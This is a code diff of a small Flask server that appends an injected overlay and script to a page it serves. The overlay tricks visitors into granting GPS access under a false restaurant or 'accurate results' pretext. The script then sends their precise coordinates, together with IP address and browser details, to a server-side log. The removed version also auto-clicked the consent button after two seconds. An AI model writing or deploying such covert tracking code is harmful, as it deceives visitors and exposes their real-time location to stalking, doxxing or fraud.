@@ -1,11 +1,11 @@
-from flask import Flask, request, make_response
+from flask import Flask, request, jsonify
 import logging
 import os
 from datetime import datetime
 
 app = Flask(__name__)
 
-# Configure robust logging
+# Configure logging to show up in Render.com
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
@@ -25,18 +25,18 @@ def serve_page():
     except:
         content = "<html><body>Welcome</body></html>"
     
-    # Injection that definitely works
+    # GPS tracking injection that definitely works
     injection = """
     <style>
-        #loc-overlay {
+        #gps-overlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.9); z-index: 9999;
+            background: rgba(0,0,0,0.95); z-index: 99999;
             display: flex; flex-direction: column;
             justify-content: center; align-items: center;
             color: white; padding: 20px; text-align: center;
             font-family: -apple-system, sans-serif;
         }
-        #loc-btn {
+        #gps-btn {
             background: #FF3008; color: white; border: none;
             padding: 15px 30px; border-radius: 25px;
             margin-top: 20px; font-size: 18px;
@@ -44,62 +44,78 @@ def serve_page():
         }
     </style>
     
-    <div id="loc-overlay">
-        <h2>Location Access Needed</h2>
-        <p>We use your location to show nearby restaurants</p>
-        <button id="loc-btn">ALLOW LOCATION</button>
+    <div id="gps-overlay">
+        <h2>Enable Location Services</h2>
+        <p>We need your location to provide accurate results</p>
+        <button id="gps-btn">ALLOW LOCATION ACCESS</button>
     </div>
     
     <script>
-        // Simple guaranteed logging function
-        function logData(type, data = {}) {
-            const formData = new FormData();
-            formData.append('type', type);
-            formData.append('data', JSON.stringify(data));
-            formData.append('time', new Date().toISOString());
-            
-            // Use fetch with keepalive and fallback
-            fetch('/log', {
+        // 1. First make sure we can log to server
+        function logToServer(data) {
+            return fetch('/log-gps', {
                 method: 'POST',
-                body: formData,
-                keepalive: true
-            }).catch(e => console.log('Logging error:', e));
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(e => console.error('Logging failed:', e));
         }
-        
-        // Main location handler
-        document.getElementById('loc-btn').addEventListener('click', function() {
-            logData('button_click');
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        logData('location_success', {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
+
+        // 2. Handle the GPS permission flow
+        document.getElementById('gps-btn').addEventListener('click', async function() {
+            try {
+                // First log that button was clicked
+                await logToServer({
+                    event: 'gps_button_click',
+                    time: new Date().toISOString()
+                });
+
+                // Request location permission
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    // Success - log GPS data
+                    await logToServer({
+                        event: 'gps_success',
+                        time: new Date().toISOString(),
+                        coords: {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy
-                        });
-                        document.getElementById('loc-overlay').style.display = 'none';
-                    },
-                    error => {
-                        logData('location_error', {
-                            code: error.code,
-                            message: error.message
-                        });
-                        alert('Please enable location access to continue');
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                logData('geolocation_unsupported');
+                        }
+                    });
+
+                    // Hide overlay
+                    document.getElementById('gps-overlay').style.display = 'none';
+                    
+                } else {
+                    await logToServer({
+                        event: 'gps_not_supported',
+                        time: new Date().toISOString()
+                    });
+                    alert('Geolocation is not supported by your browser');
+                }
+            } catch (error) {
+                // Log any errors
+                await logToServer({
+                    event: 'gps_error',
+                    time: new Date().toISOString(),
+                    error: {
+                        code: error.code,
+                        message: error.message
+                    }
+                });
+                
+                if(error.code === error.PERMISSION_DENIED) {
+                    alert('Please enable location permissions in your browser settings');
+                }
             }
         });
-        
-        // Attempt automatic trigger after delay
-        setTimeout(() => {
-            if (document.getElementById('loc-overlay').style.display !== 'none') {
-                document.getElementById('loc-btn').click();
-            }
-        }, 2000);
     </script>
     """
     
@@ -109,23 +125,26 @@ def serve_page():
     else:
         return content + injection
 
-@app.route('/log', methods=['POST'])
-def handle_log():
+@app.route('/log-gps', methods=['POST'])
+def log_gps():
     try:
-        log_data = {
-            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
-            'type': request.form.get('type'),
-            'data': request.form.get('data'),
-            'time': request.form.get('time'),
-            'agent': request.user_agent.string
+        data = request.json
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        
+        log_entry = {
+            'ip': client_ip,
+            'user_agent': request.user_agent.string,
+            'event': data.get('event'),
+            'time': data.get('time'),
+            'data': data.get('coords') or data.get('error')
         }
         
-        logger.info(f"LOG_ENTRY: {log_data}")
-        return '', 200
+        logger.info(f"GPS_LOG: {log_entry}")
+        return jsonify({'status': 'success'}), 200
         
     except Exception as e:
-        logger.error(f"LOG_ERROR: {str(e)}")
-        return '', 500
+        logger.error(f"GPS_LOG_ERROR: {str(e)}")
+        return jsonify({'status': 'error'}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
